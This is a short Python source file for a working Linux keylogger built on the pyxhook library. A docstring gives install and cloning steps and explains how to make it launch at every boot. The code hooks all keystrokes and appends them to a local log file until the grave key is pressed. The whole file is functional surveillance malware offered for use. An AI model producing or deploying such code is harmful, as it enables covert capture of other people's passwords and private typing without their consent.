
""" /*pyxhook is an implementation of pyhook (http://sourceforge.net/projects/pyhook/ 
  -Python wrapper for global input hooks in Windows.The package provides callbacks for mouse and keyboard
   events; events can be monitored and filtered.)

   Refer: http://www.techinfected.net/2015/10/how-to-make-simple-basic-keylogger-in-python-for-linux.html

   pyxhook requires python-xlib. Install it if you don't have it already. 
   ->sudo apt-get install python-xlib
   ->sudo apt-get install git (if git isn't installed)
   ->git clone https://github.com/hiamandeep/py-keylogger.git
   ->cd py-keylogger/
   Before you finally run the program, open the keylogger.py file and set log_file variable
   to your desired location for your log file.  
   ->python keylogger.py

   Now, the keylogger is active and is recording your keystrokes in file.log. press the grave key to stop it 
   and view your file.log (Note: grave key is below Esc key)

   You can also make this program start automatically after each boot. In ubuntu,
   simply add this command to startup applications.
   ->eg: python /home/aman/py-keylogger/keylogger.py
"""

import pyxhook
#change this to your log file's path
log_file='/home/mazhar/details/file.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  #fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()

